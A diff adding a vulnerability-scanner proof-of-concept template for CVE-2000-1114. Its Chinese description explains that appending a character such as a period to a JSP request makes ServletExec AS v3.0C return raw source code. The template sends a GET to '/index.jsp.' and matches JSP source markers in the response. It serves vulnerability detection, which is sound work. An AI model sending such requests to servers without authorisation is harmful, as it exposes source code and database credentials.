@@ -1,0 +1,29 @@
+[info]
+author = "ave"
+description = "通过向JSP页面请求末尾添加特殊字符（如.、+或%20）来验证ServletExec AS v3.0C是否存在源代码泄露漏洞。若服务器返回JSP源代码而非编译后的页面，则表明存在该漏洞。攻击者无需身份认证即可远程获取敏感源代码信息，包括数据库连接配置和业务逻辑代码。"
+id = "POC-AVE-2000-0810"
+name = "Unify eWave ServletExec JSP Source Disclosure PoC"
+severity = "medium"
+tags = ["ave-2000-0810"]
+vuln_id = [
+    "CVE-2000-1114",
+    "AVE-2000-0810",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/index.jsp."
+protocol = "http"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "<%",
+    "java.",
+    "import ",
+]
